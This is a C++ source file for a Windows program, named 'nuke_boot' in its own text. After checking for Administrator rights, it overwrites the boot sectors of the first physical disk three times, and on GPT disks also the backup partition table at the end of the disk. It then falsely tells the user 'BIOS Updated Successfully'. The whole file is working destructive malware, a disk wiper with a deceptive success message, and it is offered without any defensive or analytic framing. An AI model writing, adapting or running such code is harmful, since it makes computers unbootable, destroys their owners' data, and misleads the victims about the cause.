#include <windows.h>
#include <securitybaseapi.h>
#include <iostream>
#include <random>

void WriteError(const char* msg, DWORD errorCode) {
    std::cerr << "Error: " << msg << " (Code: " << errorCode << ")\n";
    ExitProcess(1);
}

void OverwriteSector(HANDLE hDisk, LARGE_INTEGER offset, BYTE* buffer, DWORD size, const char* passName) {
    SetFilePointerEx(hDisk, offset, nullptr, FILE_BEGIN);
    DWORD bytesWritten;
    if (!WriteFile(hDisk, buffer, size, &bytesWritten, nullptr) || bytesWritten != size) {
        WriteError(passName, GetLastError());
    }
}

bool IsElevated() {
    HANDLE hToken = nullptr;
    PSID adminSid = nullptr;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    BOOL isMember = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        WriteError("Cannot open process token", GetLastError());
    }

    if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, 
                                  DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminSid)) {
        CloseHandle(hToken);
        WriteError("Cannot initialize admin SID", GetLastError());
    }

    if (!CheckTokenMembership(nullptr, adminSid, &isMember)) {
        FreeSid(adminSid);
        CloseHandle(hToken);
        WriteError("Cannot check token membership", GetLastError());
    }

    FreeSid(adminSid);
    CloseHandle(hToken);
    return isMember != FALSE;
}

int main() {
    SetErrorMode(SEM_FAILCRITICALERRORS);

    if (!IsElevated()) {
        WriteError("Must run as elevated Administrator. Use 'runas /user:Administrator nuke_boot.exe' or elevated prompt.", 0);
    }

    HANDLE hDisk = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 
                              FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDisk == INVALID_HANDLE_VALUE) WriteError("Cannot open PhysicalDrive0", GetLastError());

    DISK_GEOMETRY_EX diskGeometry;
    DWORD bytesReturned;
    if (!DeviceIoControl(hDisk, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, nullptr, 0, &diskGeometry, 
                         sizeof(diskGeometry), &bytesReturned, nullptr)) {
        WriteError("Cannot get disk geometry", GetLastError());
    }

    const int SECTOR_SIZE = 512;
    const int SECTORS_TO_NUKE = 10;
    const int GPT_BACKUP_SECTORS = 33;
    BYTE* buffer = new BYTE[SECTOR_SIZE * SECTORS_TO_NUKE];
    if (!buffer) WriteError("Failed to allocate buffer", 0);
    BYTE* gptBuffer = new BYTE[SECTOR_SIZE * GPT_BACKUP_SECTORS];
    if (!gptBuffer) WriteError("Failed to allocate GPT buffer", 0);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);

    bool isGPT = false;
    BYTE layoutBuffer[4096];
    DRIVE_LAYOUT_INFORMATION_EX* layout = (DRIVE_LAYOUT_INFORMATION_EX*)layoutBuffer;
    if (DeviceIoControl(hDisk, IOCTL_DISK_GET_DRIVE_LAYOUT_EX, nullptr, 0, layout, 
                        sizeof(layoutBuffer), &bytesReturned, nullptr)) {
        isGPT = (layout->PartitionStyle == PARTITION_STYLE_GPT);
    } else {
        std::cerr << "Warning: Cannot get partition layout, assuming GPT (Code: " << GetLastError() << ")\n";
        isGPT = true;
    }

    for (int pass = 0; pass < 3; ++pass) {
        if (pass == 0) { // Random bytes
            for (int i = 0; i < SECTOR_SIZE * SECTORS_TO_NUKE; ++i) buffer[i] = dis(gen);
        } else if (pass == 1) { // Zeros
            ZeroMemory(buffer, SECTOR_SIZE * SECTORS_TO_NUKE);
        } else { // Ones
            memset(buffer, 0xFF, SECTOR_SIZE * SECTORS_TO_NUKE);
        }
        LARGE_INTEGER offset = {0};
        OverwriteSector(hDisk, offset, buffer, SECTOR_SIZE * SECTORS_TO_NUKE, 
                        pass == 0 ? "Random pass" : pass == 1 ? "Zero pass" : "Ones pass");
    }

    if (isGPT) {
        LARGE_INTEGER gptBackupOffset;
        gptBackupOffset.QuadPart = diskGeometry.DiskSize.QuadPart - SECTOR_SIZE * GPT_BACKUP_SECTORS;
        for (int pass = 0; pass < 3; ++pass) {
            if (pass == 0) {
                for (int i = 0; i < SECTOR_SIZE * GPT_BACKUP_SECTORS; ++i) gptBuffer[i] = dis(gen);
            } else if (pass == 1) {
                ZeroMemory(gptBuffer, SECTOR_SIZE * GPT_BACKUP_SECTORS);
            } else {
                memset(gptBuffer, 0xFF, SECTOR_SIZE * GPT_BACKUP_SECTORS);
            }
            OverwriteSector(hDisk, gptBackupOffset, gptBuffer, SECTOR_SIZE * GPT_BACKUP_SECTORS, 
                            pass == 0 ? "GPT backup random pass" : pass == 1 ? "GPT backup zero pass" : "GPT backup ones pass");
        }
    }

    delete[] buffer;
    delete[] gptBuffer;
    CloseHandle(hDisk);
    std::cout << "BIOS Updated Successfully 😈\n";
    return 0;
}